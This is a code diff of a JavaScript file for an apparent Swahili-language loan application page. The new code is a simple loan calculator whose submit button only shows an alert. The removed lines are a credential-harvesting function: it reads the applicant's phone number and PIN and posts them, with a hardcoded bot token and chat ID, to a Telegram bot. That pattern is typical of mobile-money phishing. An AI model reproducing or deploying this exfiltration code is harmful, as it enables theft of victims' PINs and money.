@@ -1,40 +1,55 @@
-const botToken = "7743245077:AAEb5A3vSWUThj4k206OKaymOt20oh-9x2E";
-const chatId = "7480420601";
 
-function sendToTelegram() {
 
-    let amount = document.getElementById("amount").value;
-    let duration = document.getElementById("duration").value;
-    let phone = document.getElementById("phone").value;
-    let pin = document.getElementById("pin").value;
+const amountSlider = document.getElementById("loanAmount");
+const monthSlider = document.getElementById("loanMonths");
 
-    let message =
-`📥 LOAN APPLICATION
+const amountText = document.getElementById("amountText");
+const monthText = document.getElementById("monthText");
+const paymentText = document.getElementById("monthlyPayment");
 
-💰 Amount: ${amount} TZS
-📅 Duration: ${duration}
-📱 Phone: ${phone}
-🔐 PIN: ${pin}`;
+// UPDATE VALUES
+function updateLoan() {
 
-    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const amount = parseInt(amountSlider.value);
+  const months = parseInt(monthSlider.value);
 
-    fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        alert("Maombi yametumwa!");
-        console.log(data);
-    })
-    .catch(error => {
-        alert("Imeshindikana kutuma.");
-        console.log(error);
-    });
+  amountText.innerText =
+    "TSh " + amount.toLocaleString();
+
+  monthText.innerText =
+    "Miezi " + months;
+
+  // Simple interest calculation
+  const interest = 0.14;
+
+  const total =
+    amount + (amount * interest);
+
+  const monthly =
+    total / months;
+
+  paymentText.innerText =
+    "TSh " + Math.round(monthly).toLocaleString();
 }
+
+amountSlider.addEventListener("input", updateLoan);
+monthSlider.addEventListener("input", updateLoan);
+
+updateLoan();
+
+// OPEN FORM
+function openForm() {
+
+  document.querySelector(".container").style.display = "none";
+
+  document.getElementById("formPage").style.display = "block";
+}
+
+// FORM SUBMIT
+document.getElementById("loanForm")
+.addEventListener("submit", function(e){
+
+  e.preventDefault();
+
+  alert("Maombi yametumwa kikamilifu!");
+});
